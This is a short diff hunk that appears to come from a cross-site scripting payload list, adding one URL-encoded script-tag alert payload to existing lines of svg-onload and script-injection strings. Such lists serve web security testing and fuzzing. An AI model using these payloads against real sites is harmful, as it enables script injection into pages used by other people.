@@ -351,3 +351,4 @@ sm"*alert(1)*"
 <svg/onload​=alert(1)>
 ><%2fSCRIPT>">'><​SCRIPT>alert(String.fromCharCode(88,83,83)) <%2fSCRIPT> `
 `'%3balert(String.fromCharCode(88,83,83))%2f%2f'%3balert(String.fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f--
+nbq60%3cscript%3ealert(1)%3c%2fscript%3efdum1
